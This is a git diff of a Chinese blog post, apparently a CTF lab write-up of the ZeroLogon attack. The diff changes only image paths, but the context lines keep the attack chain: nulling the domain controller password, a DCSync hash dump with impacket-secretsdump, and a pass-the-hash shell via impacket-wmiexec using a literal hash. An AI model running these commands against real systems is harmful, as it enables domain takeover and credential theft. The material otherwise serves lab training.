@@ -12,7 +12,7 @@ ZeroLogon的攻击对象的机器账户（格式为计算机名$ ）
 
 ### 获取域控的计算机名和域名
 
- nxc smb 192.168.111.100![image-20261114220311675](Zerologon.assets/image-20261114220311675.png)
+ nxc smb 192.168.111.100![image-20261114220311675](./assets/posts/Zerologon.assets/image-20261114220311675.png)
 
 得到核心信息：
 
@@ -29,7 +29,7 @@ ZeroLogon的攻击对象的机器账户（格式为计算机名$ ）
 python3 zerologon_tester.py MASTERPC 192.168.111.100
 ```
 
-因为脚本没下载成功换一个思路![image-20261114224915419](Zerologon.assets/image-20261114224915419.png)
+因为脚本没下载成功换一个思路![image-20261114224915419](./assets/posts/Zerologon.assets/image-20261114224915419.png)
 
 置空域控密码
 
@@ -43,7 +43,7 @@ DCSync导出哈希
 impacket-secretsdump -no-pass -just-dc 'myd.com/MASTERPC$@192.168.111.100'
 ```
 
-得到![image-20261114225614955](Zerologon.assets/image-20261114225614955.png)
+得到![image-20261114225614955](./assets/posts/Zerologon.assets/image-20261114225614955.png)
 
 哈希传递获取shell
 
@@ -53,7 +53,7 @@ impacket-secretsdump -no-pass -just-dc 'myd.com/MASTERPC$@192.168.111.100'
 impacket-wmiexec -hashes :ec0df45863a3751d56ba6df1e72f7218 myd.com/Administrator@192.168.111.100
 ```
 
-执行成功，终端变成C:\    ![image-20261114230232550](Zerologon.assets/image-20261114230232550.png)
+执行成功，终端变成C:\    ![image-20261114230232550](./assets/posts/Zerologon.assets/image-20261114230232550.png)
 
 找flag
 
@@ -62,4 +62,4 @@ dir C:\flag.txt /s /b
 type C:\flag.txt
 ```
 
-得到flag![image-20261114230519144](Zerologon.assets/image-20261114230519144.png)
+得到flag![image-20261114230519144](./assets/posts/Zerologon.assets/image-20261114230519144.png)
